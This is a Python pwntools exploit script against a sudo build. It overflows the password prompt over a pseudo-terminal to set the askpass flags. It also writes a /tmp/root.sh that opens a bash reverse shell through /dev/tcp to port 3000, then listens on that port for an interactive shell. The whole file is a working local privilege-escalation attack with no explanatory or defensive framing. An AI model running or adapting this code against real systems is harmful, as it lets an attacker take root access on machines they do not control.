# coding=utf-8
from pwn import*
import sys,os

TARGET=os.path.realpath("/tmp/build/bin/sudo")

def setFlags(flags):
	tgetpassFlags = {
		"TGP_NOECHO":0x00,
		"TGP_ECHO":0x01,
		"TGP_STDIN":0x02,
		"TGP_ASKPASS":0x04,
		"TGP_MASK":0x08,
		"TGP_NOECHO_TRY":0x10
	}
	flags = flags.split("|")
	retval = 0
	for i in flags:
		retval |= tgetpassFlags[i]
	return retval

if __name__ == "__main__":

	shell_path = "/tmp/root.sh"
	with open(shell_path,"w") as file:
		file.write(
		'''#!/bin/bash
		bash -c "bash -i >& /dev/tcp/127.0.0.1/3000 0>&1"
		''')
	os.chmod(shell_path,0o777)
	mfd, sfd = os.openpty()
	fd = os.open(os.ttyname(sfd), os.O_RDONLY)
	
	p = process([TARGET,"-S", "id"],stdin=fd,env={"SUDO_ASKPASS":shell_path})
	port = listen(3000)
	payload  = '\x00'*0xFE + '\x15' + '\x00' #buf
	payload += '\x00'*0x20 	#askpass_link
	payload += '\x00'*0xDD + '\x15' + '\x00'*0x28 #signo
	payload += p64(setFlags("TGP_STDIN|TGP_ASKPASS")) + '\x00'*0x14 #tgetpass_flags
	payload += '\x00'*0x30 #user_details
	payload += '\n'
	pause()
	os.write(mfd,payload)
	port.wait_for_connection()
	pause()
	port.interactive()
